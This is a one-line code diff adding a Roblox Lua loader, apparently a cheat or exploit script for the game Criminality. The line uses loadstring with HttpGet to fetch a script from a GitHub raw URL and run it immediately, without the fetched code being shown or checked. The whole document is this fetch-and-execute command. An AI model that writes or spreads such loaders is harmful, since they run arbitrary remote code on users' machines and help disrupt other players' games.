@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ContractorStrike/loaders/main/loaders/criminality-spam5-3p1oy1p1ghqr8c.lua"))()
